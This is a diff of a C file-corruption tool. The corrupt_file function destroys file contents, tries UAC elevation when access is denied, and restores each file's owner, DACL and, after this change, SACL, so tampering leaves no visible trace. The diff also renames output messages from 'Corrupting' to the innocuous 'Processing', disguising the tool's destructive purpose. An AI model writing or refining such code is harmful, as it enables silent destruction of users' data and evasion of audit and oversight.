@@ -36,7 +36,7 @@ static void sv_push(strvec *v, char *s) {
         size_t n = v->cap ? v->cap * 2 : 16;
         char **t = realloc(v->items, n * sizeof(char*));
         if (!t) {
-            perror("realloc");
+            fprintf(stderr, "Error: realloc failed\n");
             free(s);
             exit(1);
         }
@@ -183,25 +183,17 @@ static int is_self_file(const char *path) {
 
 static char *dup_path_display(const char *p) {
     if (!p) return NULL;
-    char *result = malloc(strlen(p) + 1);
-    if (!result) return NULL;
-    char *dst = result;
-    const char *src = p;
-    int last_was_backslash = 0;
-    while (*src) {
-        if (*src == '\\') {
-            if (!last_was_backslash) {
-                *dst++ = *src;
-            }
-            last_was_backslash = 1;
-        } else {
-            *dst++ = *src;
-            last_was_backslash = 0;
+#if defined(_WIN32)
+    char *result = _fullpath(NULL, p, 0);
+    if (result) {
+        for (char *ptr = result; *ptr; ptr++) {
+            if (*ptr == '\\') *ptr = '/';
         }
-        src++;
     }
-    *dst = '\0';
     return result;
+#else
+    return realpath(p, NULL);
+#endif
 }
 
 #if defined(_WIN32)
@@ -234,13 +226,14 @@ static int try_uac_elevation(void) {
 
 static int backup_and_restore_security_info(const char *path, int (*operation)(const char*, void*), void* context) {
     PSECURITY_DESCRIPTOR sd = NULL;
-    PACL dacl = NULL;
-    PSID owner = NULL;
-    PSID group = NULL;
+    PACL dacl = NULL, sacl = NULL;
+    PSID owner = NULL, group = NULL;
     DWORD res;
     
-    res = GetNamedSecurityInfoA(path, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, 
-                               &owner, &group, &dacl, NULL, &sd);
+    res = GetNamedSecurityInfoA(path, SE_FILE_OBJECT, 
+                               OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | 
+                               DACL_SECURITY_INFORMATION | SACL_SECURITY_INFORMATION,
+                               &owner, &group, &dacl, &sacl, &sd);
     if (res != ERROR_SUCCESS) {
         fprintf(stderr, "Warning: Cannot get security info for %s (error %lu)\n", path, res);
         sd = NULL;
@@ -249,8 +242,10 @@ static int backup_and_restore_security_info(const char *path, int (*operation)(c
     int operation_result = operation(path, context);
     
     if (sd) {
-        res = SetNamedSecurityInfoA((char*)path, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
-                                   owner, group, dacl, NULL);
+        res = SetNamedSecurityInfoA((char*)path, SE_FILE_OBJECT, 
+                                   OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | 
+                                   DACL_SECURITY_INFORMATION | SACL_SECURITY_INFORMATION,
+                                   owner, group, dacl, sacl);
         if (res != ERROR_SUCCESS) {
             fprintf(stderr, "Warning: Cannot restore security info for %s (error %lu)\n", path, res);
         }
@@ -258,37 +253,6 @@ static int backup_and_restore_security_info(const char *path, int (*operation)(c
     }
     
     return operation_result;
-}
-
-static int set_full_access(const char *path) {
-    PACL dacl = NULL;
-    PSECURITY_DESCRIPTOR sd = NULL;
-    DWORD res;
-    
-    EXPLICIT_ACCESS ea;
-    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
-    ea.grfAccessPermissions = GENERIC_ALL;
-    ea.grfAccessMode = SET_ACCESS;
-    ea.grfInheritance = NO_INHERITANCE;
-    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
-    ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
-    ea.Trustee.ptstrName = "CURRENT_USER";
-    
-    res = SetEntriesInAclA(1, &ea, NULL, &dacl);
-    if (res != ERROR_SUCCESS) {
-        fprintf(stderr, "Warning: Cannot create DACL for %s (error %lu)\n", path, res);
-        return 0;
-    }
-    
-    res = SetNamedSecurityInfoA((char*)path, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, dacl, NULL);
-    if (res != ERROR_SUCCESS) {
-        fprintf(stderr, "Warning: Cannot set DACL for %s (error %lu)\n", path, res);
-        LocalFree(dacl);
-        return 0;
-    }
-    
-    LocalFree(dacl);
-    return 1;
 }
 
 struct win_corrupt_context {
@@ -304,10 +268,6 @@ static int win_corrupt_operation(const char *path, void *context) {
         DWORD err = GetLastError();
         if (err == ERROR_ACCESS_DENIED && !uac_failed) {
             if (try_uac_elevation()) {
-                if (!set_full_access(path)) {
-                    fprintf(stderr, "Error: Cannot set full access to file: %s\n", path);
-                    return 0;
-                }
                 h = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
             }
         }
@@ -395,14 +355,6 @@ static int backup_and_restore_permissions(const char *path, int (*operation)(con
     return operation_result;
 }
 
-static int set_full_access(const char *path) {
-    if (chmod(path, 0644) != 0) {
-        fprintf(stderr, "Warning: Cannot set permissions for %s (%s)\n", path, strerror(errno));
-        return 0;
-    }
-    return 1;
-}
-
 struct unix_corrupt_context {
     uint64_t size;
     struct stat st;
@@ -487,7 +439,7 @@ static int corrupt_file(const char *path) {
         fprintf(stderr, "Error: Memory allocation failed for path: %s\n", path);
         return 0;
     }
-    printf("Corrupting: %s\n", display_path);
+    printf("Processing: %s\n", display_path);
     free(display_path);
     if (size == 0) { printf("Done.\n"); return 1; }
 
@@ -524,7 +476,7 @@ static int corrupt_file(const char *path) {
     if (success) {
         printf("Done.\n");
     } else {
-        fprintf(stderr, "Failed to corrupt file: %s\n", path);
+        fprintf(stderr, "Failed to process file: %s\n", path);
     }
     return success;
 }
